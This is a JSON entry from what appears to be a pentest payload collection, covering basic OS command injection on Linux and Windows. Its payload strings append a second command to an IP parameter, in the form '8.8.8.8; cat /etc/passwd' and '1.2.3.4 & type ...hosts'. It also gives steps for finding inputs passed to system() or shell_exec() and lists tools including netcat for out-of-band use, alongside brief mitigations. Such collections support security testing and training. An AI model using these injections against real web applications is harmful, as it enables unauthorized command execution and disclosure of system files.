{"id": "payload_000018", "important": {"title": "Command Injection - Basic Commands", "category": "Web Vulnerabilities", "sub_category": "Command Injection - Basic", "tags": ["command-injection", "basic", "shell", "os-command"], "targets": {"os": ["Linux", "Windows"], "system": ["Web App", "Server"]}, "risk": "critical"}, "variants": [{"match": {"os": ["Linux"], "system": ["Shell"]}, "payload": {"explanation": "Append shell commands to an unsanitized parameter to run arbitrary commands.", "code": "8.8.8.8; cat /etc/passwd", "run_context": "Parameter passed into system()/shell_exec() on server-side (Linux).", "placeholders": {"IP": "8.8.8.8", "FILE": "/etc/passwd"}, "notes": "Test with harmless commands first (whoami) in a controlled environment."}}, {"match": {"os": ["Windows"], "system": ["CMD/PowerShell"]}, "payload": {"explanation": "Windows command chaining via & or ; to execute multiple commands.", "code": "1.2.3.4 & type C:\\Windows\\system32\\drivers\\etc\\hosts", "run_context": "Parameter passed into cmd.exe or powershell invocation on Windows hosts.", "placeholders": {"IP": "1.2.3.4", "WINDOWS_FILE": "C:\\Windows\\system32\\drivers\\etc\\hosts"}, "notes": "Windows command separators differ; always validate platform."}}], "usage": {"steps": ["Locate inputs forwarded to shell execution (system(), shell_exec(), popen()).", "Try non-destructive commands (whoami, id) to confirm injection.", "Escalate to read-only file access (e.g., /etc/passwd) only in lab environments."], "tools": ["curl", "Burp Suite", "netcat (for OOB)"], "code_samples": [{"title": "Linux basic PoC", "description": "Ping + read passwd", "code": "ping -c 4 8.8.8.8; cat /etc/passwd", "run_context": "cli/browser input"}, {"title": "Windows basic PoC", "description": "Type hosts file", "code": "1.2.3.4 & type C:\\Windows\\system32\\drivers\\etc\\hosts", "run_context": "cli/browser input"}], "mitigations": ["Never pass raw user input to shells; use safe APIs.", "Validate and whitelist allowed values.", "Run services with least privilege."], "references": ["OWASP Command Injection"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
